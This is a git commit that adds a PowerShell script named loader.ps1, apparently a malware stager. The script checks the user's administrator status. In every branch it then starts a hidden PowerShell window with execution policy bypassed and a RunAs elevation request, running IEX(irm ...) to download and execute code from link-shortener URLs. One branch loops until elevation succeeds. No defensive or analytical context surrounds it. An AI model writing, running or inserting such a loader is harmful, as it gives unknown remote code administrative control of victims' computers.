a854a17e9341ff508a62ed299698ec795b2ce3a0
devilJM <97776653+devilJM@users.noreply.github.com>
2025-04-19 21:44:12 +0700

    1

---
+++ loader.ps1
@@ -0,0 +1,32 @@
+$username = $env:USERNAME
+$computer = $env:COMPUTERNAME
+
+$adminGroup = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue | Where-Object {
+    $_.Name -like "$computer\$username" -or $_.Name -like "$username"
+}
+
+
+$isElevated = ([Security.Principal.WindowsIdentity]::GetCurrent()).Owner -eq ([Security.Principal.WindowsIdentity]::GetCurrent()).User
+
+
+if ($adminGroup) {
+    if ($isElevated) {
+        
+while ($true) {
+    try {
+        #$command = "IEX(irm 'https://lc.cx/Map88u')"
+        $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
+        exit
+    } catch {
+    }
+}
+
+    } else {
+        $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
+    }
+} else {
+            $command = "IEX(irm 'https://lc.cx/oKqHDz')"
+        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
+}
